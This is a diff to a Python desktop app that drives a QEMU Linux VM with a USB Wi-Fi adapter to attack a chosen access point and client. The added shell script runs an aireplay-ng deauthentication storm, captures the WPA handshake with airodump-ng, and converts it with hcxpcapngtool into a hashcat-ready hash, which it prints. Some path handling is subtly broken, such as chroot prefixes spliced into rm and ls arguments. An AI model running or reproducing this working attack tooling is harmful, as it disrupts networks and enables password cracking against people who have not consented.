@@ -22,10 +22,26 @@ import urllib.request
 import os
 
 # ---------- fixed QEMU / VM paths (on the Mac) ----------
+# /tmp 會被 Mac 重啟清空；~/vmbuild 為持久備援（mac_vm_rebuild.sh 會同步兩邊）
 QEMU_BIN    = '/opt/homebrew/bin/qemu-system-aarch64'
-QCOW2       = '/tmp/alpine-root.qcow2'
-KERNEL      = '/tmp/alpine-boot/boot/vmlinuz-lts'
-INITRD      = '/tmp/initramfs-custom'
+_HOMEV      = os.path.expanduser('~/vmbuild')
+
+def _pick(*cands):
+    for p in cands:
+        if os.path.exists(p):
+            return p
+    return cands[0]
+
+QCOW2       = _pick('/tmp/alpine-root.qcow2', _HOMEV + '/alpine-root.qcow2')
+KERNEL      = _pick('/tmp/alpine-boot/boot/vmlinuz-lts',
+                    _HOMEV + '/alpine-boot/boot/vmlinuz-lts')
+# runner-initrd 開機確定（~30s sshd）；custom initrd 的 alpine 模式 OpenRC 會隨機卡
+INITRD      = _pick(_HOMEV + '/vmbuild/runner-initrd',
+                    '/tmp/vmbuild/runner-initrd',
+                    '/tmp/initramfs-custom',
+                    _HOMEV + '/initramfs-custom')
+RUNNER_MODE = 'runner' in os.path.basename(INITRD)
+CH          = 'chroot /newroot ' if RUNNER_MODE else ''
 SERIAL_LOG  = '/tmp/vm_app_serial.log'
 MON_SOCK    = '/tmp/vm_app_monitor.sock'
 SSH_KEY     = os.path.expanduser('~/.ssh/vm_tongbao')
@@ -304,7 +320,7 @@ class MacCaptureApp:
         """wlan0 exists + firmware loaded (rt2870.bin)."""
         try:
             r = subprocess.run(
-                VM_SSH + ' "iw dev 2>/dev/null; echo ---DMESG---; dmesg 2>/dev/null | grep -i \'Firmware detected\' | tail -1"',
+                VM_SSH + ' "%s/usr/sbin/iw dev 2>/dev/null; echo ---DMESG---; dmesg 2>/dev/null | grep -i \'Firmware detected\' | tail -1"' % CH,
                 shell=True, capture_output=True, timeout=timeout)
             out = (r.stdout or b'').decode('utf-8', 'replace')
             return ('wlan0' in out) and ('Firmware detected' in out)
@@ -321,7 +337,7 @@ class MacCaptureApp:
         self.logline('   關閉既有 QEMU ...')
         subprocess.run(['pkill', '-f', 'qemu-system-aarch64'], capture_output=True)
         time.sleep(2)
-        self.logline('   啟動 QEMU (qcow2 + custom initramfs + DWA-160) ...')
+        self.logline('   啟動 QEMU (qcow2 + %s + DWA-160) ...' % ('runner-initrd' if RUNNER_MODE else 'custom initramfs'))
         os.system('rm -f %s %s' % (SERIAL_LOG, MON_SOCK))
         cmd = ('%s -machine virt -cpu cortex-a72 -m 4096 -smp 4 '
                '-drive file=%s,format=qcow2 '
@@ -334,8 +350,12 @@ class MacCaptureApp:
                '-display none -monitor unix:%s,server,nowait'
                % (QEMU_BIN, QCOW2, KERNEL, INITRD, SERIAL_LOG, MON_SOCK))
         subprocess.Popen(cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-        self.logline('   等 95s 開機 + firmware load (rt2870.bin 延遲 ~64-80s) ...')
-        time.sleep(95)
+        if RUNNER_MODE:
+            self.logline('   runner 模式：等 ~30s sshd + firmware ...')
+            time.sleep(20)
+        else:
+            self.logline('   等 95s 開機 + firmware load (rt2870.bin 延遲 ~64-80s) ...')
+            time.sleep(95)
         self.logline('   等 wlan0 + firmware ready ...')
         for _ in range(40):
             if self.vm_ready():
@@ -374,10 +394,12 @@ class MacCaptureApp:
                 time.sleep(1)
 
     def do_scan(self):
-        script = ('iw dev wlan0 set type monitor 2>/dev/null\n'
-                  'ifconfig wlan0 up 2>/dev/null\n'
-                  'sleep 1\n'
-                  'timeout 20 iw dev wlan0 scan 2>&1\n')
+        bind = 'mount --bind /proc /newroot/proc 2>/dev/null; mount --bind /sys /newroot/sys 2>/dev/null; mount --bind /dev /newroot/dev 2>/dev/null\n' if RUNNER_MODE else ''
+        script = (bind +
+                  CH + 'iw dev wlan0 set type monitor 2>/dev/null\n' +
+                  CH + 'ifconfig wlan0 up 2>/dev/null\n' +
+                  'sleep 1\n' +
+                  CH + 'timeout 20 iw dev wlan0 scan 2>&1\n')
         try:
             r = subprocess.run(VM_SSH + ' "sh -s"', input=script.encode(),
                                capture_output=True, timeout=50, shell=True)
@@ -583,44 +605,46 @@ class MacCaptureApp:
                 self.boot_vm()
 
             self.logline('[2/5] SSH 進 VM，開抓包 (monitor + airodump + deauth storm %ss) ...' % dur)
+            bind = 'mount --bind /proc /newroot/proc 2>/dev/null; mount --bind /sys /newroot/sys 2>/dev/null; mount --bind /dev /newroot/dev 2>/dev/null\n' if RUNNER_MODE else ''
+            mid = dur - 30
+            if mid < 15:
+                mid = 15
+            # rt2800usb 每個 boot 只有「第一個 airodump 會話」能 RX；
+            # 因此 airodump 單一会話全程跑到底，絕不中途 kill/重啟。
             vm_script = (
-                'set +e\n'
-                'rm -f /tmp/capapp* /tmp/appairodump.log /tmp/appdeauth.log /tmp/airodump.log /tmp/deauth.log 2>/dev/null\n'
-                'rm -f /tmp/capfull* /tmp/captest* /tmp/par* /tmp/fg* /tmp/dbg* /tmp/alone* /tmp/mix* /tmp/fresh* 2>/dev/null\n'
-                'i=0\n'
-                'while [ $i -lt 40 ]; do\n'
-                '  if iw dev 2>/dev/null | grep -q wlan0 && dmesg 2>/dev/null | grep -q "Firmware detected"; then break; fi\n'
-                '  sleep 3; i=$((i+1))\n'
-                'done\n'
+                'set +e\n' +
+                bind +
+                'rm -f ' + CH + '/tmp/capapp* ' + CH + '/tmp/appairodump.log ' + CH + '/tmp/appdeauth.log 2>/dev/null\n' +
+                'i=0\n' +
+                'while [ $i -lt 40 ]; do\n' +
+                '  if ' + CH + 'iw dev 2>/dev/null | grep -q wlan0 && dmesg 2>/dev/null | grep -q "Firmware detected"; then break; fi\n' +
+                '  sleep 3; i=$((i+1))\n' +
+                'done\n' +
                 # monitor mode: must DOWN the iface first or "Resource busy"
-                'ifconfig wlan0 down 2>/dev/null\n'
-                'iw dev wlan0 set type monitor 2>/dev/null\n'
-                'ifconfig wlan0 up 2>&1\n'
-                'sleep 2\n'
-                'pkill -9 -f "airodump-ng|aireplay-ng" 2>/dev/null\n'
-                'sleep 1\n'
-                'rm -f /tmp/capapp* 2>/dev/null\n'
-                # deauth storm (bg); all fds -> /dev/null so it never holds the
-                # SSH session pipe; pkill -9 before exit releases it (no hang).
-                'nohup aireplay-ng --deauth 9999 --ignore-negative-one -a %s -c %s wlan0 < /dev/null > /dev/null 2>&1 &\n'
-                'sleep 3\n'
-                # airodump: SIGTERM (timeout) flushes the cap fine once monitor
-                # mode is set correctly (the earlier 0-byte caps were the "Resource
-                # busy" monitor failure, not SIGTERM). Repeat nruns x 10s.
-                'nruns=$((%s / 10)); [ $nruns -lt 1 ] && nruns=1; [ $nruns -gt 30 ] && nruns=30\n'
-                'for i in $(seq 1 $nruns); do\n'
-                '  timeout 10 airodump-ng -w /tmp/capapp -c %s wlan0 > /dev/null 2>&1\n'
-                'done\n'
-                'pkill -9 aireplay-ng 2>/dev/null\n'
-                'echo "CAP_COUNT:"; ls /tmp/capapp-*.cap 2>/dev/null | wc -l\n'
-                'echo "CAP_TOTAL:"; du -sch /tmp/capapp-*.cap 2>/dev/null | tail -1\n'
-                'ls /tmp/capapp-*.cap 2>/dev/null | xargs hcxpcapngtool -o /tmp/capapp.22000 2>&1 | tail -3\n'
-                'exec 0</dev/null 2>/dev/null\n'
-                'echo "===HASH==="\n'
-                'cat /tmp/capapp.22000 2>/dev/null\n'
-                'echo "===END==="\n'
-                'wc -l /tmp/capapp.22000 2>/dev/null\n'
-                % (bssid, client, dur, ch)
+                CH + 'ifconfig wlan0 down 2>/dev/null\n' +
+                'sleep 2\n' +
+                CH + 'iw dev wlan0 set type monitor 2>/dev/null\n' +
+                CH + 'ifconfig wlan0 up 2>&1\n' +
+                'sleep 3\n' +
+                'rm -f ' + CH + '/tmp/capapp* 2>/dev/null\n' +
+                # THE one airodump session (never killed until end)
+                'nohup ' + CH + 'airodump-ng -w /tmp/capapp -c %s wlan0 < /dev/null > /tmp/appairodump.log 2>&1 &\n' +
+                'AIRO=$!\n' +
+                'sleep 25\n' +
+                'A1=$(ls -la ' + CH + '/tmp/capapp-01.cap 2>/dev/null | awk "{print \\$5}")\n' +
+                'echo "FIRST25S: $A1"\n' +
+                # deauth storm (bg)
+                'nohup ' + CH + 'aireplay-ng --deauth 9999 --ignore-negative-one -a %s -c %s wlan0 < /dev/null > /dev/null 2>&1 &\n' +
+                'sleep %d\n' +
+                'pkill aireplay-ng 2>/dev/null\n' +
+                'sleep 2\n' +
+                'echo "CAP_TOTAL:"; ls -la ' + CH + '/tmp/capapp-01.cap 2>/dev/null\n' +
+                CH + 'hcxpcapngtool -o /tmp/capapp.22000 /tmp/capapp-01.cap 2>&1 | tail -3\n' +
+                'echo "===HASH==="\n' +
+                'cat ' + CH + '/tmp/capapp.22000 2>/dev/null\n' +
+                'echo "===END==="\n' +
+                'wc -l ' + CH + '/tmp/capapp.22000 2>/dev/null\n'
+                % (ch, bssid, client, mid)
             )
             r = subprocess.run(VM_SSH + ' "sh -s"', input=vm_script.encode(),
                                capture_output=True, timeout=dur + 200, shell=True)
